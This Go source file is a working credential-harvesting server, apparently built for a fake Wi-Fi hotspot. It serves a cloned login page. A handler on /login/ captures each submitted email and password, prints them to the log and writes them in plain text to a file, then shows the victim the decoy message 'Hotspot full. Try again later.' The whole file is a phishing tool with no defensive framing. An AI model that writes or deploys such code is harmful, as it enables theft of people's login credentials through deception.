package main

import (
    "fmt"
    "sync"
    "flag"
    "log"
    "os"
    "io/ioutil"
    "net/url"
    "net/http"
)

const INDEX_RAW_HTML = "index.raw.html"
const INDEX_HTML = "index.html"
const SUCCESS_MSG = "Hotspot full. Try again later."

const DEFAULT_PORT = 8080
const DEFAULT_LOG_FILE = "log.txt"
const DEFAULT_RES_FOLDER = "__res__"

var FILE_IO_MUTEX sync.Mutex

func main() {

    buildPtr := flag.Bool("build", false, "Wether to gather the resources of " + INDEX_RAW_HTML + ". This will exit after build, and not serve.")
    resFolderPtr := flag.String("resFolder", DEFAULT_RES_FOLDER, "The resource folder.")
    logFilePtr := flag.String("logFile", DEFAULT_LOG_FILE, "The file to write logs.")
    portPtr := flag.Uint("port", DEFAULT_PORT, "Port to serve on.")

    flag.Parse()

    if (*buildPtr) {
        build()
    } else {
        serve(*portPtr, *resFolderPtr, *logFilePtr)
    }

}

func serve(port uint, resFolder string, logFile string) {

    LOGFILE, _ := os.OpenFile(logFile,
        os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    defer LOGFILE.Close()


    http.HandleFunc("/",
        func(w http.ResponseWriter, r *http.Request) {
            serveFile(w, r, INDEX_HTML)
    })

    http.HandleFunc("/login/",
        func(w http.ResponseWriter, r *http.Request) {

            if (r.Method != "POST") {
               fmt.Fprintln(w, "404 Not found.")
               return
            }

            fmt.Fprintln(w, SUCCESS_MSG)

            body, err := ioutil.ReadAll(r.Body)

            if (err != nil) {
               fmt.Fprintln(w, "404 Not found.")
               log.Print(err)
            }

            values, err := url.ParseQuery(string(body))
            email := values["email"][0]
            pass := values["pass"][0]

            log.Printf("Email: %s, Pass: %s", email, pass)

            FILE_IO_MUTEX.Lock()
            fmt.Fprintf(LOGFILE, "user: %s, pass: %s\n", email, pass)
            FILE_IO_MUTEX.Unlock()

    })

    http.HandleFunc("/" + resFolder + "/",
        func(w http.ResponseWriter, r *http.Request) {
            serveFile(w, r, r.URL.Path[1:])
    })

    addr := ":" + fmt.Sprint(port)

    log.Printf("Serving on %s", addr)
    log.Fatal(http.ListenAndServe(addr, nil))

}

func serveFile(
    w http.ResponseWriter,
    r *http.Request,
    filename string) (error) {

        log.Printf(
            "%s wanted %s and got %s.",
            r.RemoteAddr,
            r.URL,
            filename)

    http.ServeFile(w, r, filename)
    return nil
}

func build() {
    fmt.Printf("Building: %s.\n", INDEX_RAW_HTML)
}

